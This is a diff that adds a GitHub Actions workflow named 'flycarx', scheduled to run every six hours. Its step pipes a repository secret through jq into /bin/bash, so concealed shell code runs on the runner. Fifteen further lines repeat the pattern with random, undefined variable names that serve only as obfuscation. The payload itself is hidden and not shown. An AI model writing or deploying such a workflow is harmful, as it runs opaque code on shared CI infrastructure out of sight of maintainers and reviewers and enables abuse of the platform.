@@ -1,0 +1,32 @@
+name: flycarx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: flycarx
+        env:
+          n4745: ${{ secrets.n4745 }}
+        run: |
+          echo $n4745 | jq -r .omyea9 | /bin/bash
+          echo $w396 | jq -r .bu43 | /bin/bash
+          echo $y5656 | jq -r .njz652 | /bin/bash
+          echo $ejrhi8014 | jq -r .ktho64632 | /bin/bash
+          echo $ivct56161 | jq -r .igii53073 | /bin/bash
+          echo $yq95484 | jq -r .jq5 | /bin/bash
+          echo $mv9 | jq -r .uf05710 | /bin/bash
+          echo $cxgzp35919 | jq -r .tmh0 | /bin/bash
+          echo $w8186 | jq -r .fkvtk84291 | /bin/bash
+          echo $wgniu7061 | jq -r .da4 | /bin/bash
+          echo $fhzsh8426 | jq -r .nnw330 | /bin/bash
+          echo $p92136 | jq -r .cn8 | /bin/bash
+          echo $l20661 | jq -r .ob07 | /bin/bash
+          echo $osq13273 | jq -r .pswrm6826 | /bin/bash
+          echo $g725 | jq -r .cktq22 | /bin/bash
+          echo $h8474 | jq -r .dc25875 | /bin/bash
+
